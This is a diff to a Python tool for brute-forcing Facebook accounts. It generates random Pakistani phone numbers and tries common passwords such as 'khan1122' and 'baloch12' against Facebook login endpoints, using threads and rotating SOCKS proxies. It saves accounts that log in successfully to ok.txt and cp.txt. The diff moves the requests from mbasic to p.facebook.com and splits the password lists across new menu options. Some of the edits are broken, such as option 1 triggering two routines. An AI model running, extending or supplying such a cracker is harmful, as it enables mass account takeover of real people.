@@ -292,11 +292,11 @@ def mmm(ids,names,passlist):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			
-			session.headers.update({"Host":"mbasic.facebook.com", "content-type":"application/x-www-form-urlencoded","upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
-			getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20", "Google Chrome";v="120.0.0.0"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
+			session.headers.update({"Host":"p.facebook.com", "content-type":"application/x-www-form-urlencoded","upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
+			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20", "Google Chrome";v="120.0.0.0"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
 			AXI=session.cookies.get_dict().keys()
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
@@ -365,10 +365,10 @@ def ffb(ids,names,passlist):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
 			
-			head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20", "Google Chrome";v="120.0.0.0"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Andriod"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?0', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-US,en;q=0.9,en;q=0.8,en;q=0.7'}
-			getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
+			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20", "Google Chrome";v="120.0.0.0"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Andriod"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?0', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-US,en;q=0.9,en;q=0.8,en;q=0.7'}
+			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
 			AXI=session.cookies.get_dict().keys()
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
@@ -394,11 +394,18 @@ def rifat1():
 	os.system('clear')
 	print(logo)
 	print('\x1b[1;97m[1] Pak Random Method \x1b[1;92m[1]')
+	print('\x1b[1;97m[2] Pak Random Method \x1b[1;92m[1]')
+	print('\x1b[1;97m[3] Pak Random Method \x1b[1;92m[1]')
 	print('\x1b[1;91m[7] Go to main menu')
 	linex()
 	opt = input('[√] SELECT OPT: ')
 	if opt =='1':
 		random_number1()
+	if opt =='1':
+		random_number2()
+	if opt =='3':
+		random_number3()
+			
 	
 	else:
 		print('\n\033[1;31mChoose valid option\033[0;97m')
@@ -429,7 +436,79 @@ def random_number1():
 		linex()
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,kode,kode+guru,'khankhan','khan12','khan1122','khan786','khan44','khan12','khan1122','khan123456','janjan','jan12345','khan1122','khan12','baloch','malik12','baloch12','baloch12345','malik12345']
+			pwx = ['guru','kode','kode+guru']
+			yaari.submit(fcrack,uid,pwx,tl)
+	linex()
+	print('[✓] Crack process has been completed')
+	print('[?] Idz saved in [ok.txt,cp.txt]')
+	linex()
+	input('Press Enter To Go Back To Menu')
+	menu()
+	
+#____________
+
+def random_number2():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	linex()
+	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+	os.system('clear')
+	print(logo)
+	print(' Example : 1000,5000,10000,****Etc')
+	linex()
+	limit = int(input('[+] Putt Ypur Idz lemit :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=35) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print(' Total Acounts : '+tl)
+		print(' Selected Code : \x1b[1;92m'+kode)
+		print('\x1b[1;91m If you no result use flight mode')
+		linex()
+		for guru in uid:
+			uid = kode+guru
+			pwx = ['khankhan','khan12','khan1122','khan786','khan44','khan12','khan1122','khan123456']
+			yaari.submit(fcrack,uid,pwx,tl)
+	linex()
+	print('[✓] Crack process has been completed')
+	print('[?] Idz saved in [ok.txt,cp.txt]')
+	linex()
+	input('Press Enter To Go Back To Menu')
+	menu()
+	
+#____________
+
+def random_number3():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	linex()
+	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+	os.system('clear')
+	print(logo)
+	print(' Example : 1000,5000,10000,****Etc')
+	linex()
+	limit = int(input('[+] Putt Ypur Idz lemit :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=35) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print(' Total Acounts : '+tl)
+		print(' Selected Code : \x1b[1;92m'+kode)
+		print('\x1b[1;91m If you no result use flight mode')
+		linex()
+		for guru in uid:
+			uid = kode+guru
+			pwx = ['janjan','jan12345','khan1122','khan12','baloch','malik12','baloch12','baloch12345','malik12345']
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
@@ -641,7 +720,7 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'mbasic.facebook.com',
+			header_freefb = {'authority': 'p.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
@@ -660,7 +739,7 @@ def fcrack(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
-			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
